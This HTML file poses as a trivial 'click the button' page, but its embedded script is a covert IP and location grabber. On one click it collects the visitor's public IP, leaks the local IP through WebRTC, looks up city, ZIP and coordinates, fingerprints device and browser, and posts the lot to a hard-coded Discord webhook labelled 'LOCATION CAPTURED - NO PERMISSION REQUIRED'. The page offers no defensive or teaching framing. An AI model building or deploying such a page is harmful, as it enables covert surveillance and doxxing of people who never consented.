<!DOCTYPE html>
<html>
<head>
    <title>click the button</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; }
        button { padding: 12px 24px; font-size: 16px; background-color: #5865F2; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #4752C4; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        #status { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
    </style>
</head>
<body>
    <h1>click the button website thing</h1>
    <p>click the button below:</p>
    
    <button id="trackButton">Click Me</button>
    <div id="status"></div>
    
    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
        
        function detectDevice() {
            const ua = navigator.userAgent.toLowerCase();
            let deviceType = 'Desktop';
            let os = 'Unknown';
            let browser = 'Unknown';
            
            if (/mobile|android|iphone|ipad|ipod|blackberry|iemobile|opera mini|windows phone/i.test(ua)) {
                deviceType = 'Mobile';
            }
            if (/tablet|ipad|android(?!.*mobile)|kindle|silk/i.test(ua)) {
                deviceType = 'Tablet';
            }
            
            if (/windows/.test(ua)) {
                if (/windows nt 5/.test(ua)) os = 'Windows XP';
                else if (/windows nt 6.0/.test(ua)) os = 'Windows Vista';
                else if (/windows nt 6.1/.test(ua)) os = 'Windows 7';
                else if (/windows nt 6.2/.test(ua)) os = 'Windows 8';
                else if (/windows nt 6.3/.test(ua)) os = 'Windows 8.1';
                else if (/windows nt 10/.test(ua)) os = 'Windows 10';
                else if (/windows nt 11/.test(ua)) os = 'Windows 11';
                else os = 'Windows';
            } else if (/mac os x/.test(ua)) os = 'macOS';
            else if (/linux/.test(ua)) os = 'Linux';
            else if (/android/.test(ua)) os = 'Android';
            else if (/iphone|ipad|ipod/.test(ua)) os = 'iOS';
            else if (/cros/.test(ua)) os = 'Chrome OS';
            
            if (/edg/.test(ua)) browser = 'Microsoft Edge';
            else if (/chrome/.test(ua)) browser = 'Google Chrome';
            else if (/firefox/.test(ua)) browser = 'Mozilla Firefox';
            else if (/safari/.test(ua) && !/chrome/.test(ua)) browser = 'Safari';
            else if (/opera|opr/.test(ua)) browser = 'Opera';
            else if (/msie|trident/.test(ua)) browser = 'Internet Explorer';
            else if (/brave/.test(ua)) browser = 'Brave';
            
            return { deviceType, os, browser, userAgent: navigator.userAgent };
        }
        
        async function getLocalIP() {
            return new Promise((resolve) => {
                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                if (!RTCPeerConnection) {
                    resolve('WebRTC not supported');
                    return;
                }
                
                const pc = new RTCPeerConnection({ iceServers: [] });
                const ips = [];
                
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(err => {});
                
                pc.onicecandidate = (event) => {
                    if (!event.candidate) {
                        if (ips.length) {
                            resolve(ips[0]);
                        } else {
                            resolve('Not detected');
                        }
                        return;
                    }
                    
                    const candidate = event.candidate.candidate;
                    const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const match = candidate.match(regex);
                    
                    if (match) {
                        const ip = match[1];
                        if (ip.startsWith('192.168.') || ip.startsWith('10.') || 
                            (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31)) {
                            if (!ips.includes(ip)) {
                                ips.push(ip);
                            }
                        }
                    }
                };
                
                setTimeout(() => {
                    pc.close();
                    resolve(ips.length ? ips[0] : 'Not detected');
                }, 1000);
            });
        }
        
        async function getBestLocation(ip) {
            const locationAPIs = [
                {
                    url: `https://ipapi.co/${ip}/json/`,
                    parse: (data) => ({
                        city: data.city || 'Unknown',
                        region: data.region || 'Unknown',
                        country: data.country_name || 'Unknown',
                        isp: data.org || 'Unknown',
                        zip: data.postal || 'Unknown',
                        timezone: data.timezone || 'Unknown',
                        lat: data.latitude ? parseFloat(data.latitude).toFixed(8) : 'Unknown',
                        lon: data.longitude ? parseFloat(data.longitude).toFixed(8) : 'Unknown',
                        source: 'ipapi.co'
                    })
                },
                {
                    url: `https://ipwhois.app/json/${ip}`,
                    parse: (data) => ({
                        city: data.city || 'Unknown',
                        region: data.region || 'Unknown',
                        country: data.country || 'Unknown',
                        isp: data.isp || 'Unknown',
                        zip: data.zip || 'Unknown',
                        timezone: data.timezone || 'Unknown',
                        lat: data.latitude ? parseFloat(data.latitude).toFixed(8) : 'Unknown',
                        lon: data.longitude ? parseFloat(data.longitude).toFixed(8) : 'Unknown',
                        source: 'ipwhois.app'
                    })
                },
                {
                    url: `https://api.ipgeolocation.io/ipgeo?apiKey=demo&ip=${ip}`,
                    parse: (data) => ({
                        city: data.city || 'Unknown',
                        region: data.state_prov || 'Unknown',
                        country: data.country_name || 'Unknown',
                        isp: data.isp || 'Unknown',
                        zip: data.zipcode || 'Unknown',
                        timezone: data.time_zone.name || 'Unknown',
                        lat: data.latitude ? parseFloat(data.latitude).toFixed(8) : 'Unknown',
                        lon: data.longitude ? parseFloat(data.longitude).toFixed(8) : 'Unknown',
                        source: 'ipgeolocation.io'
                    })
                }
            ];
            
            for (const api of locationAPIs) {
                try {
                    const response = await fetch(api.url);
                    const data = await response.json();
                    const location = api.parse(data);
                    
                    if (location.lat !== 'Unknown' && location.lon !== 'Unknown' && location.city !== 'Unknown') {
                        return location;
                    }
                } catch (e) {
                    continue;
                }
            }
            
            return {
                city: 'Unknown',
                region: 'Unknown',
                country: 'Unknown',
                isp: 'Unknown',
                zip: 'Unknown',
                timezone: 'Unknown',
                lat: 'Unknown',
                lon: 'Unknown',
                source: 'All APIs failed'
            };
        }
        
        async function getTimezoneLocation() {
            try {
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const response = await fetch(`https://timezoneapi.io/api/timezone/?${timezone}&token=azhwCvdeFlrTTIqRjBqR`);
                const data = await response.json();
                
                if (data.data && data.data.timezone && data.data.timezone.location) {
                    return {
                        lat: parseFloat(data.data.timezone.location.latitude).toFixed(8),
                        lon: parseFloat(data.data.timezone.location.longitude).toFixed(8),
                        city: data.data.timezone.capital || 'Unknown',
                        country: data.data.timezone.country || 'Unknown',
                        source: 'Timezone API'
                    };
                }
            } catch (e) {
                console.log('Timezone API failed');
            }
            
            return null;
        }
        
        async function getVPNProxyInfo(ip) {
            try {
                const response = await fetch(`https://v2.api.iphub.info/ip/${ip}`);
                const data = await response.json();
                return {
                    isVPN: data.block === 1 ? 'Yes' : 'No',
                    hostname: data.hostname || 'Unknown',
                    asn: data.asn || 'Unknown'
                };
            } catch (e) {
                return {
                    isVPN: 'Unknown',
                    hostname: 'Unknown',
                    asn: 'Unknown'
                };
            }
        }
        
        document.getElementById('trackButton').addEventListener('click', async function() {
            const button = this;
            const status = document.getElementById('status');
            
            button.disabled = true;
            button.textContent = 'Processing...';
            status.style.display = 'none';
            
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const publicIP = ipData.ip;
                
                const localIP = await getLocalIP();
                
                const ipLocation = await getBestLocation(publicIP);
                
                const timezoneLocation = await getTimezoneLocation();
                
                const deviceInfo = detectDevice();
                
                const vpnInfo = await getVPNProxyInfo(publicIP);
                
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const screenDepth = screen.colorDepth;
                const pixelRatio = window.devicePixelRatio || 1;
                
                const cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
                const doNotTrack = navigator.doNotTrack || navigator.msDoNotTrack || 'Unknown';
                const onlineStatus = navigator.onLine ? 'Online' : 'Offline';
                const referrer = document.referrer || 'Direct visit';
                const language = navigator.language || 'Unknown';
                
                let finalLat = ipLocation.lat;
                let finalLon = ipLocation.lon;
                let mapsLink = 'No coordinates available';
                
                if (timezoneLocation && timezoneLocation.lat !== 'Unknown' && timezoneLocation.lon !== 'Unknown') {
                    finalLat = timezoneLocation.lat;
                    finalLon = timezoneLocation.lon;
                }
                
                if (finalLat !== 'Unknown' && finalLon !== 'Unknown') {
                    mapsLink = `https://www.google.com/maps/@${finalLat},${finalLon},15z`;
                }
                
                const now = new Date();
                const dateStr = `${now.getDate()}/${now.getMonth()+1}/${now.getFullYear()}`;
                let hours = now.getHours();
                const ampm = hours >= 12 ? 'PM' : 'AM';
                hours = hours % 12;
                hours = hours ? hours : 12;
                const timeStr = `${hours.toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')} ${ampm}`;
                
                const embed = {
                    title: "LOCATION CAPTURED - NO PERMISSION REQUIRED",
                    color: 16711680,
                    fields: [
                        {
                            name: "NETWORK INFORMATION",
                            value: `Public IP: ${publicIP}\nLocal IP: ${localIP}\nISP: ${ipLocation.isp}\nVPN/Proxy: ${vpnInfo.isVPN}\nHostname: ${vpnInfo.hostname}`,
                            inline: true
                        },
                        {
                            name: "IP GEOLOCATION",
                            value: `City: ${ipLocation.city}\nRegion: ${ipLocation.region}\nCountry: ${ipLocation.country}\nZIP: ${ipLocation.zip}\nTimezone: ${ipLocation.timezone}`,
                            inline: true
                        },
                        {
                            name: "COORDINATES",
                            value: `Latitude: ${finalLat}\nLongitude: ${finalLon}\nAccuracy Source: ${ipLocation.source}\nTimezone Source: ${timezoneLocation ? timezoneLocation.source : 'None'}\nGoogle Maps: ${mapsLink}`,
                            inline: true
                        },
                        {
                            name: "DEVICE INFORMATION",
                            value: `Device Type: ${deviceInfo.deviceType}\nOperating System: ${deviceInfo.os}\nBrowser: ${deviceInfo.browser}\nScreen: ${screenWidth}x${screenHeight}\nLanguage: ${language}`,
                            inline: true
                        },
                        {
                            name: "TIME & SESSION",
                            value: `Date: ${dateStr}\nTime: ${timeStr}\nReferrer: ${referrer.substring(0, 40)}${referrer.length > 40 ? '...' : ''}\nPage URL: ${window.location.href}`,
                            inline: false
                        }
                    ],
                    footer: {
                        text: `Location Sources: ${ipLocation.source} â€¢ No GPS permission requested`
                    },
                    timestamp: new Date().toISOString()
                };
                
                const discordMessage = {
                    embeds: [embed],
                    username: "Location Tracker"
                };
                
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(discordMessage)
                });
                
                if (response.ok) {
                    status.textContent = 'Location captured. Check Discord.';
                    status.style.color = '#4CAF50';
                    status.style.backgroundColor = '#E8F5E9';
                } else {
                    throw new Error('Discord error');
                }
                
            } catch (error) {
                console.error('Error:', error);
                status.textContent = 'An error occurred. Please try again.';
                status.style.color = '#F44336';
                status.style.backgroundColor = '#FFEBEE';
            } finally {
                button.disabled = false;
                button.textContent = 'click me';
                status.style.display = 'block';
            }
        });
    </script>
</body>
</html>
